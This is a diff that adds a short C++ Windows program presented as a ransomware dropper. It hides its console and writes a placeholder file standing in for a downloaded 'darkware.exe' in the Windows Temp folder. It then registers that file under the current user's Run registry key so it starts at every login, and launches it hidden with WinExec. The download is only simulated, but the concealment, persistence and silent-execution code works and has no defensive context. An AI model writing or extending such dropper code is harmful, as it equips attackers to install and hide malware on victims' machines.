@@ -1,0 +1,38 @@
+#include <windows.h>
+#include <string>
+#include <fstream>
+
+bool downloadRansomware() {
+    // Simulate downloading ransomware binary (in a real scenario, this would use WinINet or similar API)
+    std::string ransomwarePath = "C:\\Windows\\Temp\\darkware.exe";
+    std::string dummyDownload = "Simulated download of ransomware binary.";
+    std::ofstream ransomwareFile(ransomwarePath, std::ios::out | std::ios::binary);
+    if (!ransomwareFile) {
+        return false;
+    }
+    ransomwareFile.write(dummyDownload.c_str(), dummyDownload.size());
+    ransomwareFile.close();
+    return true;
+}
+
+void scheduleExecution() {
+    // Add ransomware to startup via registry
+    HKEY hKey;
+    std::string ransomwarePath = "C:\\Windows\\Temp\\darkware.exe";
+    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, regPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueEx(hKey, "DarkWare", 0, REG_SZ, (const BYTE*)ransomwarePath.c_str(), ransomwarePath.size() + 1);
+        RegCloseKey(hKey);
+    }
+
+    // Execute ransomware immediately
+    WinExec(ransomwarePath.c_str(), SW_HIDE);
+}
+
+int main() {
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    if (downloadRansomware()) {
+        scheduleExecution();
+    }
+    return 0;
+}
